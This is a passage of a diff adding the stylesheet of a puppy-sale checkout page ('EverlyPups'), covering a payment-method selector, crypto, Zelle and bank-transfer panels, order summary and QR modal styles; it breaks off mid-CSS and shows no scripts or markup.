@@ -1,0 +1,3060 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Complete Your Payment - EverlyPups</title>
+  
+  <!-- Fonts & Icons -->
+  <link href="https://fonts.googleapis.com/css2?family=Nunito:wght@400;600;700;800&family=Inter:wght@400;500;600;700;800&display=swap" rel="stylesheet" />
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css" />
+  
+  <style>
+    /* ==========================================================================
+       1. Global Styles & Reset
+       ========================================================================== */
+    :root {
+      --brand-primary: #219653;
+      --brand-primary-hover: #1B7A43;
+      --text-main: #333333;
+      --text-muted: #64748B;
+      --bg-light: #F8FAFC;
+      --border-color: #E2E8F0;
+      --radius-lg: 12px;
+      --radius-full: 9999px;
+      --transition-smooth: all 0.2s ease-in-out;
+    }
+
+    body {
+      margin: 0;
+      padding: 0;
+      background-color: var(--bg-light);
+      color: var(--text-main);
+      font-family: 'Inter', sans-serif;
+      -webkit-font-smoothing: antialiased;
+    }
+
+    /* ==========================================================================
+       2. Checkout Header & Footer
+       ========================================================================== */
+    .checkout-header {
+      display: flex !important;
+      justify-content: space-between !important;
+      align-items: center !important;
+      padding: 1.25rem 2rem !important;
+      background-color: #ffffff !important;
+      border-bottom: 1px solid var(--border-color) !important;
+      box-sizing: border-box !important;
+    }
+
+    .checkout-header-logo {
+      font-family: 'Nunito', sans-serif !important;
+      font-size: 1.5rem !important;
+      font-weight: 800 !important;
+      color: var(--brand-primary) !important;
+      text-decoration: none !important;
+      display: flex !important;
+      align-items: center !important;
+      gap: 0.5rem !important;
+    }
+
+    .checkout-header-right {
+      display: flex !important;
+      align-items: center !important;
+    }
+
+    .header-phone-link {
+      display: flex !important;
+      align-items: center !important;
+      gap: 0.5rem !important;
+      font-size: 0.9rem !important;
+    }
+
+    .checkout-footer {
+      background-color: #ffffff !important;
+      border-top: 1px solid var(--border-color) !important;
+      padding: 2rem !important;
+      margin-top: 4rem !important;
+    }
+
+    .checkout-footer-container {
+      max-width: 1200px !important;
+      margin: 0 auto !important;
+      display: flex !important;
+      justify-content: space-between !important;
+      align-items: center !important;
+      flex-wrap: wrap !important;
+      gap: 1rem !important;
+    }
+
+    .footer-links-list {
+      list-style: none !important;
+      padding: 0 !important;
+      margin: 0 !important;
+      display: flex !important;
+      gap: 1.5rem !important;
+      font-size: 0.85rem !important;
+      color: var(--text-muted) !important;
+    }
+
+    .footer-links-list a {
+      color: var(--text-muted) !important;
+      text-decoration: none !important;
+    }
+
+    .footer-links-list a:hover {
+      text-decoration: underline !important;
+    }
+
+    .copyright {
+      font-weight: 600 !important;
+    }
+
+    /* ==========================================================================
+       3. Grid Page Layout
+       ========================================================================== */
+    .checkout-section {
+      max-width: 1200px !important;
+      margin: 2.5rem auto 0 auto !important;
+      padding: 0 1.5rem !important;
+      box-sizing: border-box !important;
+    }
+
+    .checkout-grid {
+      display: grid !important;
+      grid-template-columns: 1.85fr 1fr !important;
+      column-gap: 2.5rem !important;
+      align-items: start !important;
+    }
+
+    /* Column Direct Placements on Desktop */
+    .page-header { grid-column: 1 / 2; margin-bottom: 1.5rem !important; }
+    .method-selector { grid-column: 1 / 2; margin-bottom: 1.5rem !important; }
+    .active-method-container { grid-column: 1 / 2; margin-bottom: 1rem !important; }
+    .payment-progress { grid-column: 1 / 2; margin-bottom: 1.5rem !important; }
+    .trust-info { grid-column: 1 / 2; margin-bottom: 2rem !important; }
+    
+    .order-summary {
+      grid-column: 2 / 3;
+      grid-row: 1 / 7;
+      position: sticky !important;
+      top: 2rem !important;
+    }
+
+    /* ==========================================================================
+       4. Left Column Components Styling
+       ========================================================================== */
+    /* 4.1 Page Header */
+    .payment-title-group {
+      text-align: left !important;
+      border-bottom: 1px solid #E2E8F0 !important;
+      padding-bottom: 1rem !important;
+    }
+
+    .payment-main-title {
+      font-family: 'Nunito', sans-serif !important;
+      font-size: 1.75rem !important;
+      font-weight: 800 !important;
+      color: #0F172A !important;
+      margin: 0 0 0.4rem 0 !important;
+    }
+
+    .payment-supporting-text {
+      font-family: 'Inter', sans-serif !important;
+      font-size: 0.9rem !important;
+      color: var(--text-muted) !important;
+      margin: 0 !important;
+    }
+
+    /* 4.2 Payment Selector Horizontal Cards */
+    .payment-method-selector {
+      display: flex !important;
+      gap: 0.75rem !important;
+    }
+
+    .selector-card {
+      flex: 1 !important;
+      display: flex !important;
+      align-items: center !important;
+      border: 2px solid #E2E8F0 !important;
+      border-radius: var(--radius-lg) !important;
+      padding: 0.85rem !important;
+      background-color: #ffffff !important;
+      cursor: pointer !important;
+      transition: var(--transition-smooth) !important;
+      box-sizing: border-box !important;
+      user-select: none !important;
+      position: relative !important;
+    }
+
+    .selector-card:hover {
+      border-color: #CBD5E1 !important;
+      transform: translateY(-2px) !important;
+      box-shadow: 0 4px 12px rgba(0, 0, 0, 0.05) !important;
+    }
+
+    .selector-card.active {
+      border-color: var(--brand-primary) !important;
+      background-color: #F4FBF7 !important;
+    }
+
+    .selector-card-icon {
+      width: 36px !important;
+      height: 36px !important;
+      border-radius: 8px !important;
+      background-color: #F1F5F9 !important;
+      color: #475569 !important;
+      display: flex !important;
+      align-items: center !important;
+      justify-content: center !important;
+      font-size: 1.1rem !important;
+      margin-right: 0.75rem !important;
+      flex-shrink: 0 !important;
+    }
+
+    .selector-card.active .selector-card-icon {
+      background-color: #D1FAE5 !important;
+      color: #059669 !important;
+    }
+
+    .selector-card-info {
+      flex: 1 !important;
+      text-align: left !important;
+    }
+
+    .selector-card-title {
+      font-family: 'Nunito', sans-serif !important;
+      font-size: 0.9rem !important;
+      font-weight: 800 !important;
+      color: #1E293B !important;
+      margin-bottom: 0.1rem !important;
+    }
+
+    .selector-card-desc {
+      font-family: 'Inter', sans-serif !important;
+      font-size: 0.725rem !important;
+      color: var(--text-muted) !important;
+      line-height: 1.25 !important;
+    }
+
+    .selector-card-radio {
+      width: 16px !important;
+      height: 16px !important;
+      border-radius: 50% !important;
+      border: 2px solid #CBD5E1 !important;
+      display: flex !important;
+      align-items: center !important;
+      justify-content: center !important;
+      flex-shrink: 0 !important;
+      margin-left: 0.5rem !important;
+      box-sizing: border-box !important;
+    }
+
+    .selector-card.active .selector-card-radio {
+      border-color: var(--brand-primary) !important;
+      background-color: var(--brand-primary) !important;
+    }
+
+    .selector-card.active .selector-card-radio::after {
+      content: '' !important;
+      width: 6px !important;
+      height: 6px !important;
+      background-color: #ffffff !important;
+      border-radius: 50% !important;
+    }
+
+    /* 4.3 Active Method Content Card & Payment States */
+    .method-detail-card {
+      background-color: #ffffff !important;
+      border: 1px solid var(--border-color) !important;
+      border-radius: var(--radius-lg) !important;
+      padding: 1.5rem !important;
+      box-shadow: 0 4px 6px -1px rgba(0, 0, 0, 0.05) !important;
+      box-sizing: border-box !important;
+    }
+
+    .card-header {
+      font-family: 'Nunito', sans-serif !important;
+      font-size: 1.2rem !important;
+      font-weight: 800 !important;
+      color: #0F172A !important;
+      margin-bottom: 1.25rem !important;
+      text-align: left !important;
+    }
+
+    .crypto-amount-row {
+      display: flex !important;
+      justify-content: space-between !important;
+      align-items: center !important;
+      background-color: var(--bg-light) !important;
+      border: 1px solid #E2E8F0 !important;
+      border-radius: 8px !important;
+      padding: 0.85rem 1rem !important;
+      margin-bottom: 1.25rem !important;
+    }
+
+    .amount-label {
+      font-family: 'Inter', sans-serif !important;
+      font-size: 0.85rem !important;
+      color: var(--text-muted) !important;
+      font-weight: 500 !important;
+    }
+
+    .amount-value {
+      font-family: 'Nunito', sans-serif !important;
+      font-size: 1.15rem !important;
+      color: #0F172A !important;
+      font-weight: 800 !important;
+    }
+
+    .crypto-select-group {
+      margin-bottom: 1.25rem !important;
+      text-align: left !important;
+    }
+
+    .crypto-select-label {
+      display: block !important;
+      font-family: 'Inter', sans-serif !important;
+      font-size: 0.8rem !important;
+      font-weight: 700 !important;
+      color: #475569 !important;
+      margin-bottom: 0.4rem !important;
+      text-transform: uppercase !important;
+      letter-spacing: 0.05em !important;
+    }
+
+    /* Custom drop down select */
+    .input-wrapper {
+      height: 52px !important;
+      border: 1px solid #CBD5E1 !important;
+      border-radius: 10px !important;
+      padding: 0 1rem !important;
+      display: flex !important;
+      align-items: center !important;
+      background-color: #ffffff !important;
+      transition: var(--transition-smooth) !important;
+      box-sizing: border-box !important;
+    }
+
+    .input-wrapper.open,
+    .input-wrapper:focus-within {
+      border-color: var(--brand-primary) !important;
+      box-shadow: 0 0 0 2px rgba(33, 150, 83, 0.15) !important;
+    }
+
+    .custom-select-container {
+      position: relative !important;
+      width: 100% !important;
+      cursor: pointer !important;
+      user-select: none !important;
+    }
+
+    .custom-select-trigger {
+      display: flex !important;
+      justify-content: space-between !important;
+      align-items: center !important;
+      width: 100% !important;
+      height: 48px !important;
+      font-family: 'Inter', sans-serif !important;
+      font-size: 0.95rem !important;
+      box-sizing: border-box !important;
+    }
+
+    .custom-select-placeholder {
+      color: #94A3B8 !important;
+    }
+
+    .custom-select-placeholder.selected-val {
+      color: #333333 !important;
+    }
+
+    .custom-select-arrow {
+      color: #333333 !important;
+      font-size: 0.85rem !important;
+      transition: transform 0.2s ease !important;
+    }
+
+    .custom-select-container.open .custom-select-arrow {
+      transform: rotate(180deg) !important;
+    }
+
+    .custom-select-dropdown {
+      position: absolute !important;
+      top: calc(100% + 8px) !important;
+      left: -1rem !important;
+      right: -1rem !important;
+      background-color: #ffffff !important;
+      border: 1px solid #E2E8F0 !important;
+      border-radius: 12px !important;
+      box-shadow: 0 10px 25px -5px rgba(0, 0, 0, 0.1), 0 8px 10px -6px rgba(0, 0, 0, 0.1) !important;
+      z-index: 9999 !important;
+      max-height: 220px !important;
+      overflow-y: auto !important;
+      padding: 6px !important;
+      box-sizing: border-box !important;
+    }
+
+    .custom-select-dropdown::-webkit-scrollbar {
+      width: 6px !important;
+    }
+
+    .custom-select-dropdown::-webkit-scrollbar-track {
+      background: transparent !important;
+    }
+
+    .custom-select-dropdown::-webkit-scrollbar-thumb {
+      background-color: #CBD5E1 !important;
+      border-radius: 3px !important;
+    }
+
+    .custom-select-option {
+      padding: 10px 14px !important;
+      font-family: 'Inter', sans-serif !important;
+      font-size: 0.95rem !important;
+      color: #334155 !important;
+      border-radius: 8px !important;
+      transition: background-color 0.15s ease, color 0.15s ease !important;
+      cursor: pointer !important;
+      text-align: left !important;
+    }
+
+    .custom-select-option:hover {
+      background-color: #F1F5F9 !important;
+      color: #1E293B !important;
+    }
+
+    .custom-select-option.selected {
+      background-color: #EFF6FF !important;
+      color: #2563EB !important;
+      font-weight: 600 !important;
+    }
+
+    /* Coin details summary card */
+    .coin-details-section {
+      border: 1px solid #E2E8F0 !important;
+      border-radius: 8px !important;
+      padding: 1rem !important;
+      margin-bottom: 1.25rem !important;
+      text-align: left !important;
+      box-sizing: border-box !important;
+    }
+
+    .coin-detail-row {
+      display: flex !important;
+      justify-content: space-between !important;
+      font-size: 0.85rem !important;
+      margin-bottom: 0.65rem !important;
+      font-family: 'Inter', sans-serif !important;
+    }
+
+    .coin-detail-row:last-child {
+      margin-bottom: 0 !important;
+    }
+
+    .coin-detail-lbl {
+      color: var(--text-muted) !important;
+      font-weight: 500 !important;
+    }
+
+    .coin-detail-val {
+      color: #1E293B !important;
+      font-weight: 700 !important;
+      text-align: right !important;
+    }
+
+    .address-font {
+      font-family: 'Courier New', Courier, monospace !important;
+      font-size: 0.85rem !important;
+      word-break: break-all !important;
+    }
+
+    .crypto-action-links {
+      display: flex !important;
+      gap: 0.75rem !important;
+      margin-bottom: 1.25rem !important;
+    }
+
+    .crypto-action-btn {
+      flex: 1 !important;
+      background-color: #F1F5F9 !important;
+      border: 1px solid #E2E8F0 !important;
+      color: #475569 !important;
+      padding: 0.65rem !important;
+      border-radius: 8px !important;
+      font-family: 'Inter', sans-serif !important;
+      font-size: 0.8rem !important;
+      font-weight: 700 !important;
+      cursor: pointer !important;
+      transition: var(--transition-smooth) !important;
+      display: flex !important;
+      align-items: center !important;
+      justify-content: center !important;
+      gap: 0.35rem !important;
+      box-sizing: border-box !important;
+    }
+
+    .crypto-action-btn:hover {
+      background-color: #E2E8F0 !important;
+      color: #1E293B !important;
+    }
+
+    .crypto-action-btn.highlight-btn {
+      background-color: #EFF6FF !important;
+      border-color: #BFDBFE !important;
+      color: #2563EB !important;
+    }
+
+    .crypto-action-btn.highlight-btn:hover {
+      background-color: #DBEAFE !important;
+      color: #1D4ED8 !important;
+    }
+
+    /* Verification state loaders */
+    .verification-wrapper {
+      display: flex !important;
+      align-items: center !important;
+      gap: 1.25rem !important;
+      padding: 0.5rem 0 !important;
+      box-sizing: border-box !important;
+    }
+
+    .spinner-box {
+      width: 48px !important;
+      height: 48px !important;
+      display: flex !important;
+      align-items: center !important;
+      justify-content: center !important;
+      flex-shrink: 0 !important;
+    }
+
+    .compact-spinner {
+      width: 32px !important;
+      height: 32px !important;
+      border: 3px solid #E2E8F0 !important;
+      border-top-color: var(--brand-primary) !important;
+      border-radius: 50% !important;
+      animation: spin 0.8s linear infinite !important;
+    }
+
+    @keyframes spin {
+      to { transform: rotate(360deg); }
+    }
+
+    .verification-info {
+      text-align: left !important;
+    }
+
+    .verification-title {
+      font-family: 'Nunito', sans-serif !important;
+      font-size: 1.15rem !important;
+      font-weight: 800 !important;
+      color: #0F172A !important;
+      margin-bottom: 0.25rem !important;
+    }
+
+    .verification-desc {
+      font-family: 'Inter', sans-serif !important;
+      font-size: 0.85rem !important;
+      color: var(--text-muted) !important;
+      margin-bottom: 0.4rem !important;
+    }
+
+    .verification-status {
+      font-family: 'Inter', sans-serif !important;
+      font-size: 0.8rem !important;
+      font-weight: 600 !important;
+      color: #475569 !important;
+    }
+
+    .status-lbl-yellow {
+      color: #D97706 !important;
+      font-weight: 700 !important;
+    }
+
+    /* Confirmed state details */
+    .confirmed-wrapper {
+      text-align: left !important;
+    }
+
+    .confirmed-header-box {
+      display: flex !important;
+      align-items: center !important;
+      gap: 1rem !important;
+    }
+
+    .confirmed-badge-circle {
+      width: 44px !important;
+      height: 44px !important;
+      background-color: #D1FAE5 !important;
+      color: #10B981 !important;
+      border-radius: 50% !important;
+      display: flex !important;
+      align-items: center !important;
+      justify-content: center !important;
+      font-size: 1.5rem !important;
+      flex-shrink: 0 !important;
+    }
+
+    .confirmed-info {
+      display: flex !important;
+      flex-direction: column !important;
+    }
+
+    .confirmed-title {
+      font-family: 'Nunito', sans-serif !important;
+      font-size: 1.15rem !important;
+      font-weight: 800 !important;
+      color: #064E3B !important;
+      margin-bottom: 0.15rem !important;
+    }
+
+    .confirmed-desc {
+      font-family: 'Inter', sans-serif !important;
+      font-size: 0.85rem !important;
+      color: #065F46 !important;
+    }
+
+    .confirmed-divider {
+      height: 1px !important;
+      background-color: #E2E8F0 !important;
+      border: none !important;
+      margin: 1rem 0 !important;
+    }
+
+    .receipt-section {
+      background-color: #F0FDF4 !important;
+      border: 1px solid #A7F3D0 !important;
+      border-radius: 8px !important;
+      padding: 0.85rem 1rem !important;
+      box-sizing: border-box !important;
+    }
+
+    .receipt-row {
+      display: flex !important;
+      justify-content: space-between !important;
+      font-size: 0.85rem !important;
+      margin-bottom: 0.5rem !important;
+      font-family: 'Inter', sans-serif !important;
+    }
+
+    .receipt-row:last-child {
+      margin-bottom: 0 !important;
+    }
+
+    .receipt-lbl {
+      color: #065F46 !important;
+      font-weight: 500 !important;
+    }
+
+    .receipt-val {
+      color: #064E3B !important;
+      font-weight: 700 !important;
+    }
+
+    .status-lbl-green {
+      color: var(--brand-primary) !important;
+      font-weight: 800 !important;
+    }
+
+    /* Zelle & Bank Transfer instructions styles */
+    .how-it-works-title {
+      font-family: 'Nunito', sans-serif !important;
+      font-size: 0.95rem !important;
+      font-weight: 800 !important;
+      color: #1E293B !important;
+      margin: 1.25rem 0 0.85rem 0 !important;
+      text-align: left !important;
+    }
+
+    .steps-flow {
+      display: flex !important;
+      flex-direction: column !important;
+      gap: 0.85rem !important;
+      margin-bottom: 1.25rem !important;
+    }
+
+    .step-flow-item {
+      display: flex !important;
+      align-items: flex-start !important;
+    }
+
+    .step-flow-num {
+      font-family: 'Nunito', sans-serif !important;
+      font-size: 0.85rem !important;
+      font-weight: 800 !important;
+      color: var(--brand-primary) !important;
+      width: 24px !important;
+      height: 24px !important;
+      background-color: #F4FBF7 !important;
+      border-radius: 50% !important;
+      display: flex !important;
+      align-items: center !important;
+      justify-content: center !important;
+      margin-right: 0.75rem !important;
+      flex-shrink: 0 !important;
+      box-sizing: border-box !important;
+    }
+
+    .step-flow-text {
+      text-align: left !important;
+    }
+
+    .step-flow-heading {
+      font-family: 'Inter', sans-serif !important;
+      font-size: 0.85rem !important;
+      font-weight: 700 !important;
+      color: #1E293B !important;
+      margin-bottom: 0.1rem !important;
+    }
+
+    .step-flow-desc {
+      font-family: 'Inter', sans-serif !important;
+      font-size: 0.775rem !important;
+      color: var(--text-muted) !important;
+      line-height: 1.35 !important;
+    }
+
+    .bank-labels-row {
+      display: flex !important;
+      gap: 0.5rem !important;
+      margin-bottom: 1rem !important;
+    }
+
+    .bank-label-tag {
+      background-color: #EFF6FF !important;
+      color: #1D4ED8 !important;
+      font-family: 'Inter', sans-serif !important;
+      font-size: 0.7rem !important;
+      font-weight: 700 !important;
+      padding: 0.3rem 0.65rem !important;
+      border-radius: 99px !important;
+    }
+
+    /* Information alert info card warning details */
+    .info-alert-card {
+      display: flex !important;
+      align-items: flex-start !important;
+      gap: 0.75rem !important;
+      background-color: #EFF6FF !important;
+      border: 1px solid #DBEAFE !important;
+      border-radius: 8px !important;
+      padding: 0.85rem !important;
+      margin-bottom: 1.25rem !important;
+      box-sizing: border-box !important;
+    }
+
+    .info-alert-icon-blue {
+      color: #2563EB !important;
+      font-size: 1.05rem !important;
+      margin-top: 0.1rem !important;
+      flex-shrink: 0 !important;
+    }
+
+    .info-alert-text {
+      font-family: 'Inter', sans-serif !important;
+      font-size: 0.8rem !important;
+      color: #1E3A8A !important;
+      line-height: 1.4 !important;
+      text-align: left !important;
+    }
+
+    .info-alert-text strong {
+      color: #1E293B !important;
+    }
+
+    .btn-primary-action {
+      width: 100% !important;
+      height: 48px !important;
+      border-radius: 99px !important;
+      border: none !important;
+      background-color: var(--brand-primary) !important;
+      color: #ffffff !important;
+      font-family: 'Inter', sans-serif !important;
+      font-weight: 800 !important;
+      font-size: 0.9rem !important;
+      box-shadow: 0 4px 16px rgba(33, 150, 83, 0.3) !important;
+      cursor: pointer !important;
+      display: flex !important;
+      align-items: center !important;
+      justify-content: center !important;
+      gap: 0.5rem !important;
+      transition: var(--transition-smooth) !important;
+      box-sizing: border-box !important;
+    }
+
+    .btn-primary-action:hover:not(:disabled) {
+      background-color: var(--brand-primary-hover) !important;
+      transform: translateY(-2px) !important;
+      box-shadow: 0 6px 20px rgba(33, 150, 83, 0.4) !important;
+    }
+
+    .btn-primary-action:active:not(:disabled) {
+      transform: translateY(0) scale(0.98) !important;
+    }
+
+    .btn-primary-action:disabled {
+      background-color: #E2E8F0 !important;
+      color: #94A3B8 !important;
+      cursor: not-allowed !important;
+      box-shadow: none !important;
+      transform: none !important;
+    }
+
+    /* Sent confirmation instructions details block styling */
+    .instructions-sent-wrapper {
+      text-align: left !important;
+    }
+
+    .sent-instruction-body {
+      font-family: 'Inter', sans-serif !important;
+      font-size: 0.825rem !important;
+      color: #92400E !important;
+      line-height: 1.45 !important;
+      margin: 0 0 1rem 0 !important;
+    }
+
+    .sent-status-badge-row {
+      display: flex !important;
+      align-items: center !important;
+      gap: 0.5rem !important;
+    }
+
+    .sent-status-lbl {
+      font-family: 'Inter', sans-serif !important;
+      font-size: 0.8rem !important;
+      color: #92400E !important;
+      font-weight: 600 !important;
+    }
+
+    .sent-status-badge {
+      background-color: #FEF3C7 !important;
+      color: #D97706 !important;
+      font-family: 'Inter', sans-serif !important;
+      font-size: 0.7rem !important;
+      font-weight: 800 !important;
+      padding: 0.25rem 0.65rem !important;
+      border-radius: 99px !important;
+      text-transform: uppercase !important;
+      letter-spacing: 0.05em !important;
+    }
+
+    /* 4.4 Compact Stepper Progress tracker */
+    .compact-progress-tracker {
+      display: flex !important;
+      align-items: center !important;
+      justify-content: space-between !important;
+      background-color: #ffffff !important;
+      border: 1px solid var(--border-color) !important;
+      border-radius: var(--radius-lg) !important;
+      padding: 0.85rem 1rem !important;
+      box-shadow: 0 2px 4px rgba(0, 0, 0, 0.02) !important;
+      box-sizing: border-box !important;
+    }
+
+    .progress-step {
+      display: flex !important;
+      align-items: center !important;
+      gap: 0.35rem !important;
+      font-size: 0.725rem !important;
+      font-family: 'Inter', sans-serif !important;
+      color: #94A3B8 !important;
+      font-weight: 500 !important;
+    }
+
+    .progress-step.completed {
+      color: var(--brand-primary) !important;
+      font-weight: 700 !important;
+    }
+
+    .progress-step.active {
+      color: #1E293B !important;
+      font-weight: 800 !important;
+    }
+
+    .progress-indicator {
+      display: inline-flex !important;
+      align-items: center !important;
+      justify-content: center !important;
+      font-size: 0.7rem !important;
+      width: 14px !important;
+      height: 14px !important;
+    }
+
+    .progress-step.completed .progress-indicator {
+      font-size: 0.75rem !important;
+    }
+
+    .progress-text {
+      white-space: nowrap !important;
+    }
+
+    .progress-arrow {
+      color: #CBD5E1 !important;
+      font-size: 0.65rem !important;
+    }
+
+    /* 4.5 Reassurance Trust Badges subtle layout row */
+    .subtle-trust-row {
+      display: flex !important;
+      justify-content: space-between !important;
+      gap: 1rem !important;
+      box-sizing: border-box !important;
+    }
+
+    .subtle-trust-item {
+      display: flex !important;
+      align-items: center !important;
+      gap: 0.4rem !important;
+      flex: 1 !important;
+    }
+
+    .trust-mini-icon {
+      font-size: 0.9rem !important;
+      color: var(--brand-primary) !important;
+      flex-shrink: 0 !important;
+    }
+
+    .trust-mini-text {
+      display: flex !important;
+      flex-direction: column !important;
+      text-align: left !important;
+    }
+
+    .trust-mini-title {
+      font-family: 'Nunito', sans-serif !important;
+      font-size: 0.75rem !important;
+      font-weight: 800 !important;
+      color: #1E293B !important;
+      line-height: 1.25 !important;
+    }
+
+    .trust-mini-desc {
+      font-family: 'Inter', sans-serif !important;
+      font-size: 0.65rem !important;
+      color: var(--text-muted) !important;
+      line-height: 1.25 !important;
+    }
+
+    /* ==========================================================================
+       5. Right Column Sticky Order Summary Card Styling
+       ========================================================================== */
+    .sticky-summary-card {
+      background-color: #ffffff !important;
+      border: 1px solid var(--border-color) !important;
+      border-radius: var(--radius-lg) !important;
+      padding: 1.25rem !important;
+      box-shadow: 0 4px 6px -1px rgba(0, 0, 0, 0.05) !important;
+      box-sizing: border-box !important;
+      text-align: left !important;
+    }
+
+    .summary-header {
+      font-family: 'Nunito', sans-serif !important;
+      font-size: 1.1rem !important;
+      font-weight: 800 !important;
+      color: #0F172A !important;
+      margin-bottom: 1rem !important;
+    }
+
+    .summary-puppy-info {
+      display: flex !important;
+      align-items: center !important;
+      gap: 0.85rem !important;
+      margin-bottom: 1rem !important;
+    }
+
+    .summary-puppy-img-box {
+      width: 60px !important;
+      height: 60px !important;
+      border-radius: 8px !important;
+      overflow: hidden !important;
+      background-color: var(--bg-light) !important;
+      flex-shrink: 0 !important;
+    }
+
+    .summary-puppy-img {
+      width: 100% !important;
+      height: 100% !important;
+      object-fit: cover !important;
+    }
+
+    .summary-puppy-details {
+      display: flex !important;
+      flex-direction: column !important;
+      gap: 0.1rem !important;
+    }
+
+    .summary-puppy-name {
+      font-family: 'Nunito', sans-serif !important;
+      font-size: 1rem !important;
+      font-weight: 800 !important;
+      color: #1E293B !important;
+    }
+
+    .summary-puppy-breed {
+      font-family: 'Inter', sans-serif !important;
+      font-size: 0.8rem !important;
+      color: var(--text-muted) !important;
+      font-weight: 500 !important;
+    }
+
+    .summary-puppy-specs {
+      font-family: 'Inter', sans-serif !important;
+      font-size: 0.75rem !important;
+      color: #94A3B8 !important;
+    }
+
+    .summary-divider {
+      height: 1px !important;
+      background-color: var(--border-color) !important;
+      border: none !important;
+      margin: 1rem 0 !important;
+    }
+
+    .summary-price-row {
+      display: flex !important;
+      justify-content: space-between !important;
+      align-items: center !important;
+    }
+
+    .summary-price-label {
+      font-family: 'Inter', sans-serif !important;
+      font-size: 0.825rem !important;
+      color: var(--text-muted) !important;
+      font-weight: 500 !important;
+    }
+
+    .summary-price-val {
+      font-family: 'Nunito', sans-serif !important;
+      font-size: 0.95rem !important;
+      color: #1E293B !important;
+      font-weight: 800 !important;
+    }
+
+    .summary-inclusions-box {
+      display: flex !important;
+      flex-direction: column !important;
+      gap: 0.5rem !important;
+    }
+
+    .inclusions-title {
+      font-family: 'Nunito', sans-serif !important;
+      font-size: 0.8rem !important;
+      font-weight: 800 !important;
+      color: #012B3A !important;
+      text-transform: uppercase !important;
+      letter-spacing: 0.05em !important;
+      margin-bottom: 0.15rem !important;
+    }
+
+    .inclusions-list {
+      list-style: none !important;
+      padding: 0 !important;
+      margin: 0 !important;
+      display: flex !important;
+      flex-direction: column !important;
+      gap: 0.45rem !important;
+    }
+
+    .inclusions-list li {
+      font-family: 'Inter', sans-serif !important;
+      font-size: 0.775rem !important;
+      color: #475569 !important;
+      line-height: 1.3 !important;
+      display: flex !important;
+      align-items: flex-start !important;
+      gap: 0.4rem !important;
+    }
+
+    .inclusion-check {
+      color: var(--brand-primary) !important;
+      font-size: 0.85rem !important;
+      margin-top: 0.1rem !important;
+      flex-shrink: 0 !important;
+    }
+
+    .summary-total-row {
+      display: flex !important;
+      justify-content: space-between !important;
+      align-items: center !important;
+    }
+
+    .total-label {
+      font-family: 'Nunito', sans-serif !important;
+      font-size: 1rem !important;
+      font-weight: 800 !important;
+      color: #0F172A !important;
+    }
+
+    .total-val {
+      font-family: 'Nunito', sans-serif !important;
+      font-size: 1.25rem !important;
+      color: var(--brand-primary) !important;
+      font-weight: 800 !important;
+    }
+
+    /* ==========================================================================
+       6. QR Code Centered Modal Overlay Styling
+       ========================================================================== */
+    .modal-overlay {
+      position: fixed !important;
+      top: 0 !important;
+      left: 0 !important;
+      width: 100% !important;
+      height: 100% !important;
+      background-color: rgba(15, 23, 42, 0.4) !important;
+      backdrop-filter: blur(4px) !important;
+      z-index: 100000 !important;
+      display: none !important;
+      align-items: center !important;
+      justify-content: center !important;
+      padding: 1rem !important;
+      box-sizing: border-box !important;
+    }
+
+    .modal-overlay.open {
+      display: flex !important;
+    }
+
+    .modal-content {
+      background-color: #ffffff !important;
+      border-radius: 16px !important;
+      box-shadow: 0 20px 25px -5px rgba(0, 0, 0, 0.1), 0 10px 10px -5px rgba(0, 0, 0, 0.04) !important;
+      width: 100% !important;
+      max-width: 420px !important;
+      box-sizing: border-box !important;
+      display: flex !important;
+      flex-direction: column !important;
+      overflow: hidden !important;
+      animation: modalFadeIn 0.2s ease-out !important;
+    }
+
+    @keyframes modalFadeIn {
+      from { opacity: 0; transform: scale(0.96); }
+      to { opacity: 1; transform: scale(1); }
+    }
+
+    .modal-header {
+      padding: 1rem 1.25rem !important;
+      border-bottom: 1px solid #F1F5F9 !important;
+      display: flex !important;
+      justify-content: space-between !important;
+      align-items: center !important;
+      box-sizing: border-box !important;
+    }
+
+    .modal-title {
+      font-family: 'Nunito', sans-serif !important;
+      font-size: 1.1rem !important;
+      font-weight: 800 !important;
+      color: #0F172A !important;
+    }
+
+    .modal-close-icon {
+      background: none !important;
+      border: none !important;
+      font-size: 1.4rem !important;
+      color: #94A3B8 !important;
+      cursor: pointer !important;
+      padding: 0 !important;
+      line-height: 1 !important;
+      transition: color 0.15s ease !important;
+    }
+
+    .modal-close-icon:hover {
+      color: #475569 !important;
+    }
+
+    .modal-body {
+      padding: 1.25rem !important;
+      overflow-y: auto !important;
+      box-sizing: border-box !important;
+      text-align: center !important;
+    }
+
+    .modal-usd-amount {
+      font-family: 'Nunito', sans-serif !important;
+      font-size: 1.35rem !important;
+      font-weight: 800 !important;
+      color: var(--brand-primary) !important;
+      margin-bottom: 0.75rem !important;
+    }
+
+    .modal-crypto-row {
+      display: flex !important;
+      justify-content: space-between !important;
+      font-size: 0.825rem !important;
+      margin-bottom: 0.4rem !important;
+      font-family: 'Inter', sans-serif !important;
+    }
+
+    .modal-crypto-lbl {
+      color: var(--text-muted) !important;
+      font-weight: 500 !important;
+    }
+
+    .modal-crypto-val {
+      color: #1E293B !important;
+      font-weight: 700 !important;
+    }
+
+    .modal-qr-container {
+      margin: 1.25rem auto !important;
+      width: 200px !important;
+      height: 200px !important;
+      display: flex !important;
+      align-items: center !important;
+      justify-content: center !important;
+    }
+
+    .large-qr-mockup {
+      width: 100% !important;
+      height: 100% !important;
+      border: 1px solid #E2E8F0 !important;
+      border-radius: 12px !important;
+      background-color: #ffffff !important;
+      display: flex !important;
+      align-items: center !important;
+      justify-content: center !important;
+      box-shadow: 0 4px 6px -1px rgba(0, 0, 0, 0.05) !important;
+      box-sizing: border-box !important;
+    }
+
+    .modal-qr-icon {
+      font-size: 6.5rem !important;
+      color: #0F172A !important;
+    }
+
+    .modal-address-section {
+      text-align: left !important;
+      margin-bottom: 1rem !important;
+    }
+
+    .modal-address-lbl {
+      display: block !important;
+      font-size: 0.7rem !important;
+      font-weight: 700 !important;
+      color: #64748B !important;
+      text-transform: uppercase !important;
+      letter-spacing: 0.05em !important;
+      margin-bottom: 0.3rem !important;
+      font-family: 'Inter', sans-serif !important;
+    }
+
+    .modal-address-box {
+      display: flex !important;
+      align-items: center !important;
+      background-color: #F8FAFC !important;
+      border: 1px solid #E2E8F0 !important;
+      border-radius: 8px !important;
+      overflow: hidden !important;
+      box-sizing: border-box !important;
+      height: 38px !important;
+    }
+
+    .modal-address-text {
+      flex: 1 !important;
